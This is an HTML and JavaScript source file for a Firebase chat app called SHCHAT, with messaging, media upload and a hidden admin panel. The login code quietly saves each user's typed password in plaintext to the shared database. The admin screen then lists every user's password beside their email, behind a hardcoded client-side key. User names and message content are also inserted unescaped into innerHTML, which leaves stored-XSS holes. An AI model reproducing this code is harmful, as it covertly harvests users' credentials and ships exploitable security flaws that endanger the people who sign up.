<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>SHCHAT | Ultimate Admin Fix</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
    <style>
        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; width: 100%; position: fixed; background: #fff; font-family: sans-serif; }
        .app-container { display: flex; flex-direction: column; height: 100vh; width: 100vw; position: relative; }
        #auth-screen, #main-screen, #chat-screen, #admin-screen { display: flex; flex-direction: column; height: 100%; width: 100%; position: absolute; top: 0; left: 0; background: white; }
        .hidden { display: none !important; }
        .avatar { width: 50px; height: 50px; border-radius: 50%; object-fit: cover; border: 2px solid #2563eb; }
        .avatar-sm { width: 42px; height: 42px; border-radius: 50%; object-fit: cover; }
        #chat-messages { flex: 1; overflow-y: auto; padding: 15px; background: #f1f5f9; display: flex; flex-direction: column; gap: 8px; }
        .msg-bubble { max-width: 75%; padding: 10px; border-radius: 15px; font-size: 14px; position: relative; cursor: pointer; }
        .sent { background: #2563eb; color: white; align-self: flex-end; border-bottom-right-radius: 2px; }
        .received { background: white; color: #1e293b; align-self: flex-start; border-bottom-left-radius: 2px; border: 1px solid #e2e8f0; }
        .msg-media { width: 100%; border-radius: 10px; margin-bottom: 5px; }
        .seen-status { font-size: 9px; opacity: 0.8; text-align: right; margin-top: 2px; display: block; font-weight: bold; }
    </style>
</head>
<body>

    <div class="app-container">
        <div id="auth-screen">
            <div class="flex-1 flex flex-col items-center justify-center px-10 text-center">
                <h1 class="text-6xl font-black italic text-blue-600 mb-8">SHCHAT</h1>
                <div id="signup-box" class="hidden w-full mb-4 flex flex-col items-center">
                    <img id="reg-preview" src="https://cdn-icons-png.flaticon.com/512/149/149071.png" class="w-24 h-24 rounded-full border-4 border-red-500 mb-3 object-cover shadow-lg">
                    <label class="bg-red-500 text-white px-4 py-1 rounded-full text-xs font-bold cursor-pointer mb-4">Set Photo <input type="file" accept="image/*" class="hidden" onchange="previewDP(this)"></label>
                    <input id="reg-name" type="text" placeholder="Full Name" class="w-full p-4 bg-gray-50 border-2 rounded-2xl outline-none">
                </div>
                <div class="w-full space-y-3">
                    <input id="auth-email" type="email" placeholder="Email" class="w-full p-4 bg-gray-50 border-2 rounded-2xl outline-none">
                    <input id="auth-pass" type="password" placeholder="Password" class="w-full p-4 bg-gray-50 border-2 rounded-2xl outline-none">
                    <button id="auth-btn" onclick="handleAuth()" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-black shadow-xl mt-4">LOGIN</button>
                    <p onclick="toggleAuth()" id="toggle-text" class="mt-6 text-sm font-bold text-blue-600 cursor-pointer">Register Now</p>
                </div>
                <button onclick="openAdminPrompt()" class="mt-16 text-[10px] text-gray-300 uppercase tracking-widest">Admin Control</button>
            </div>
        </div>

        <div id="main-screen" class="hidden">
            <header class="p-4 border-b flex justify-between items-center bg-white shadow-sm">
                <div class="flex items-center gap-3">
                    <img id="my-dp" src="" class="avatar-sm">
                    <h2 class="text-2xl font-black text-blue-600 italic">SHCHAT</h2>
                </div>
                <button onclick="logout()" class="text-xs font-bold text-red-500 px-4 py-2 bg-red-50 rounded-full">LOGOUT</button>
            </header>
            <div id="user-list" class="flex-1 overflow-y-auto"></div>
        </div>

        <div id="chat-screen" class="hidden">
            <header class="p-3 border-b flex items-center gap-3 bg-white">
                <button onclick="closeChat()" class="text-blue-600 text-3xl">‚Üê</button>
                <img id="chat-dp" src="" class="avatar-sm">
                <h3 id="chat-title" class="font-bold text-slate-800 text-sm">User</h3>
            </header>
            <div id="chat-messages"></div>
            <div id="media-preview-box" class="hidden p-2 bg-blue-50 text-[10px] font-bold text-blue-600 flex justify-between">
                <span>Attachment Ready</span><button onclick="cancelMedia()" class="text-red-500">Remove</button>
            </div>
            <div class="p-3 border-t bg-white flex gap-2 items-center">
                <label class="bg-gray-100 p-3 rounded-full cursor-pointer">
                    üìé<input type="file" id="media-input" class="hidden" accept="image/*,video/*" onchange="handleMediaSelect(this)">
                </label>
                <input id="msg-input" type="text" placeholder="Message..." class="flex-1 bg-gray-100 p-3 rounded-full outline-none">
                <button onclick="sendMsg()" class="bg-blue-600 text-white w-12 h-12 rounded-full shadow-lg">‚û§</button>
            </div>
        </div>

        <div id="admin-screen" class="hidden">
            <header class="p-4 bg-slate-900 text-white flex justify-between items-center">
                <h2 class="font-bold tracking-widest">ADMIN PANEL</h2>
                <button onclick="closeAdmin()" class="bg-red-600 px-4 py-1.5 rounded-full text-xs font-bold">EXIT</button>
            </header>
            <div id="admin-user-list" class="flex-1 overflow-y-auto bg-slate-50 p-4"></div>
        </div>
    </div>

    <script>
        const firebaseConfig = {
          apiKey: "AIzaSyAgxa0djoIwMYA9Nx7HIdRg_KifHnoEHdU",
          authDomain: "chating-app-c7c06.firebaseapp.com",
          databaseURL: "https://chating-app-c7c06-default-rtdb.europe-west1.firebasedatabase.app/",
          projectId: "chating-app-c7c06",
          storageBucket: "chating-app-c7c06.firebasestorage.app",
          messagingSenderId: "939070083870",
          appId: "1:939070083870:web:95bf5ef1495edb027caf0f"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth(), rtdb = firebase.database();
        let currentUser = null, activeChatId = null, selectedMedia = null, mediaType = "", isSignupMode = false, base64DP = "";

        auth.onAuthStateChanged(user => {
            if(user) {
                currentUser = user;
                const userRef = rtdb.ref('users/' + user.uid);
                userRef.on('value', snap => {
                    const u = snap.val();
                    if(u && u.banned) { auth.signOut(); return; }
                    if(!snap.exists()) {
                        userRef.set({ uid: user.uid, name: localStorage.getItem('sh_name')||'User', email: user.email, pass: localStorage.getItem('sh_pass')||'Saved', dp: "https://cdn-icons-png.flaticon.com/512/149/149071.png", status: 'online', banned: false });
                    } else { document.getElementById('my-dp').src = u.dp; }
                    userRef.update({ status: 'online' });
                    userRef.onDisconnect().update({ status: 'offline' });
                    document.getElementById('auth-screen').classList.add('hidden');
                    document.getElementById('main-screen').classList.remove('hidden');
                    loadUsers();
                });
            } else { document.getElementById('auth-screen').classList.remove('hidden'); document.getElementById('main-screen').classList.add('hidden'); }
        });

        function loadAdminUsers() {
            rtdb.ref('users').on('value', snap => {
                const list = document.getElementById('admin-user-list'); list.innerHTML = "";
                snap.forEach(c => {
                    const u = c.val();
                    const isBanned = u.banned === true;
                    list.innerHTML += `<div class="p-4 bg-white border rounded-2xl mb-4 shadow-md ${isBanned ? 'opacity-60' : ''}">
                        <div class="flex items-center gap-3">
                            <img src="${u.dp}" class="w-14 h-14 rounded-full border-2 border-blue-500">
                            <div class="flex-1">
                                <p class="font-black text-slate-800 text-lg">${u.name} ${isBanned ? 'üî¥' : 'üü¢'}</p>
                                <p class="text-xs font-bold text-blue-600">${u.email}</p>
                                <p class="text-[11px] font-mono text-red-600 mt-1 uppercase">PASS: <span class="bg-red-50 px-2 py-0.5 rounded border border-red-100">${u.pass || 'Unknown'}</span></p>
                            </div>
                        </div>
                        <div class="flex gap-2 mt-4">
                            <button onclick="rtdb.ref('users/${c.key}').update({banned: ${!isBanned}})" class="flex-1 ${isBanned ? 'bg-green-600' : 'bg-orange-500'} text-white py-2.5 rounded-xl text-xs font-black uppercase tracking-widest">${isBanned ? 'Unban' : 'Ban User'}</button>
                            <button onclick="if(confirm('Delete User?')) rtdb.ref('users/${c.key}').remove()" class="bg-gray-100 text-red-600 px-4 py-2.5 rounded-xl text-xs font-black uppercase">Wipe</button>
                        </div>
                    </div>`;
                });
            });
        }

        // Standard Functions
        function loadUsers() {
            rtdb.ref('users').on('value', snap => {
                const list = document.getElementById('user-list'); list.innerHTML = "";
                snap.forEach(c => {
                    const u = c.val();
                    if(c.key !== currentUser.uid && !u.banned) {
                        list.innerHTML += `<div class="p-4 border-b flex items-center gap-4 active:bg-gray-50" onclick='openChat(${JSON.stringify(u)})'>
                            <img src="${u.dp}" class="avatar shadow-sm">
                            <div><p class="font-bold">${u.name}</p><p class="text-[10px] ${u.status==='online'?'text-green-500':'text-gray-400'}">${u.status||'offline'}</p></div>
                        </div>`;
                    }
                });
            });
        }

        function openChat(u) {
            activeChatId = currentUser.uid < u.uid ? currentUser.uid+"_"+u.uid : u.uid+"_"+currentUser.uid;
            document.getElementById('chat-screen').classList.remove('hidden');
            document.getElementById('chat-title').innerText = u.name;
            document.getElementById('chat-dp').src = u.dp;
            const chatRef = rtdb.ref(`chats/${activeChatId}/messages`);
            chatRef.on('value', s => {
                const mc = document.getElementById('chat-messages'); mc.innerHTML = "";
                s.forEach(msg => {
                    const m = msg.val();
                    const isMe = m.senderId === currentUser.uid;
                    if(!isMe && m.status !== 'seen') { chatRef.child(msg.key).update({ status: 'seen' }); }
                    let mediaHtml = m.media ? (m.type === 'image' ? `<img src="${m.media}" class="msg-media">` : `<video src="${m.media}" class="msg-media" controls></video>`) : "";
                    mc.innerHTML += `<div class="msg-bubble ${isMe ? 'sent' : 'received'}" onclick="deleteMsg('${msg.key}', '${m.senderId}')">
                        ${mediaHtml} <p>${m.text || ''}</p>
                        ${isMe ? `<span class="seen-status">${m.status === 'seen' ? '‚úì Seen' : '‚úì'}</span>` : ''}
                    </div>`;
                });
                mc.scrollTop = mc.scrollHeight;
            });
        }

        window.deleteMsg = (mid, sid) => { if(sid === currentUser.uid && confirm("Delete?")) rtdb.ref(`chats/${activeChatId}/messages/${mid}`).remove(); };
        window.sendMsg = () => {
            const text = document.getElementById('msg-input').value.trim();
            if(!text && !selectedMedia) return;
            rtdb.ref(`chats/${activeChatId}/messages`).push({ senderId: currentUser.uid, text: text, media: selectedMedia, type: mediaType, status: 'sent', time: Date.now() });
            document.getElementById('msg-input').value = ""; cancelMedia();
        };

        window.handleMediaSelect = (i) => {
            const f = i.files[0]; if(!f) return;
            const r = new FileReader(); r.onload = (e) => { selectedMedia = e.target.result; mediaType = f.type.startsWith('image') ? 'image' : 'video'; document.getElementById('media-preview-box').classList.remove('hidden'); };
            r.readAsDataURL(f);
        };

        window.cancelMedia = () => { selectedMedia = null; document.getElementById('media-preview-box').classList.add('hidden'); };
        window.handleAuth = async () => {
            const e = document.getElementById('auth-email').value, p = document.getElementById('auth-pass').value, n = document.getElementById('reg-name').value;
            localStorage.setItem('sh_pass', p); localStorage.setItem('sh_name', n);
            try { if(isSignupMode) { await auth.createUserWithEmailAndPassword(e, p); } else { await auth.signInWithEmailAndPassword(e, p); } } catch(err) { alert(err.message); }
        };

        window.toggleAuth = () => { isSignupMode = !isSignupMode; document.getElementById('signup-box').classList.toggle('hidden'); document.getElementById('toggle-text').innerText = isSignupMode ? "Back to Login" : "Register Now"; };
        window.openAdminPrompt = () => { if(prompt("Key:") === "THAKUR8439") { document.getElementById('admin-screen').classList.remove('hidden'); loadAdminUsers(); } };
        window.closeChat = () => document.getElementById('chat-screen').classList.add('hidden');
        window.closeAdmin = () => document.getElementById('admin-screen').classList.add('hidden');
        window.logout = () => { if(currentUser) rtdb.ref('users/' + currentUser.uid).update({status: 'offline'}).then(() => auth.signOut()); };
        window.previewDP = (i) => { const r = new FileReader(); r.onload = (e) => { base64DP = e.target.result; document.getElementById('reg-preview').src = base64DP; }; r.readAsDataURL(i.files[0]); };
    </script>
</body>
</html>
